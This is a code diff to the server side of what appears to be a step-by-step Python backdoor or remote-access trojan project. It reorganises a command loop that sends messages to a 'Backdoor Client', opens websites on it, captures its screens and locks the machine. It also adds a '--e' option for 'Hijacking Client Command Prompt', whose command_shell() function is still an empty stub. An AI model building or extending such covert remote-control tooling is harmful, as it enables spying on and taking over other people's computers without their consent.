@@ -255,48 +255,6 @@ def select_connection(connection_id, get_response):
         return conn
 
 
-# Step 19: Define `send_commands()` Function to Send Commands to the Client
-# All Commands except Main Menu Commands should define in this function
-def send_commands():
-    while True:
-        prompt = f"({arrInfo[0]}){arrInfo[3]}@{arrInfo[1]}"
-        strChoice = input(f"{fColors.LIGHT_YELLOW}{prompt}$>> {fColors.RESET}")
-
-        #--m [MESSAGE]: Command for Send Message to Client
-        if strChoice[:3] == '--m' and len(strChoice) > 3:
-            strMsg= 'msg' + strChoice[3:]
-            send(str.encode(strMsg))
-
-        # --o [WEBSITE_URL]: Command for Open Website on the Backdoor Client
-        elif strChoice[:3] == '--o' and len(strChoice) > 3:
-            strSite = 'site' + strChoice[4:]
-            send(str.encode(strSite))
-
-        # --p: Used for taking screenshot from all screens on the Client
-        elif strChoice == '--p' or strChoice == 'screenshot':
-            screenshot()
-
-        # --p 1: Used for taking screenshot from only Primary screen on the Client
-        elif strChoice == '--p 1' or strChoice == 'primary_screenshoot':
-            screenshot(all_monitors=False)
-
-        # --x 1: Used for Locking the Client Machine
-        elif strChoice == '--x 1' or strChoice == 'lock':
-            send(b'lock')
-
-
-        # TODO: Own Implementation
-        # --h, See Commands List Help Menu
-        elif strChoice == '--h' or strChoice == 'help':
-            commands_help()
-            send_commands()
-
-        # --x or exit: Command for Close Server, Client and Connection in Command MODE
-        elif strChoice == '--x' or strChoice == 'exit':
-            close()
-            exit(0)
-
-
 # Step 28: Define & Complete `screenshot()` Function on the Server
 def screenshot(all_monitors=True):
 
@@ -340,6 +298,58 @@ def screenshot(all_monitors=True):
 
     except Exception as e:
         print(fColors.LIGHT_RED + f"[-] Error while Saving Screenshot.\nError: {fColors.RESET}{e}")
+
+
+def command_shell():
+    pass
+
+
+# Step 19: Define `send_commands()` Function to Send Commands to the Client
+# All Commands except Main Menu Commands should define in this function
+
+def send_commands():
+    while True:
+        prompt = f"({arrInfo[0]}){arrInfo[3]}@{arrInfo[1]}"
+        strChoice = input(f"{fColors.LIGHT_YELLOW}{prompt}$>> {fColors.RESET}")
+
+        #--m [MESSAGE]: Command for Send Message to Client
+        if strChoice[:3] == '--m' and len(strChoice) > 3:
+            strMsg= 'msg' + strChoice[3:]
+            send(str.encode(strMsg))
+
+        # --o [WEBSITE_URL]: Command for Open Website on the Backdoor Client
+        elif strChoice[:3] == '--o' and len(strChoice) > 3:
+            strSite = 'site' + strChoice[4:]
+            send(str.encode(strSite))
+
+        # --p: Used for taking screenshot from all screens on the Client
+        elif strChoice == '--p' or strChoice == 'screenshot':
+            screenshot()
+
+        # --p 1: Used for taking screenshot from only Primary screen on the Client
+        elif strChoice == '--p 1' or strChoice == 'primary_screenshoot':
+            screenshot(all_monitors=False)
+
+        # --x 1: Used for Locking the Client Machine
+        elif strChoice == '--x 1' or strChoice == 'lock':
+            send(b'lock')
+
+        # --e: Used for Hijacking Client Command Prompt
+        elif strChoice[:3] == '--e':
+            command_shell()
+
+
+        # TODO: Own Implementation
+        # --h, See Commands List Help Menu
+        elif strChoice == '--h' or strChoice == 'help':
+            commands_help()
+            send_commands()
+
+        # --x or exit: Command for Close Server, Client and Connection in Command MODE
+        elif strChoice == '--x' or strChoice == 'exit':
+            close()
+            exit(0)
+
 
 
 
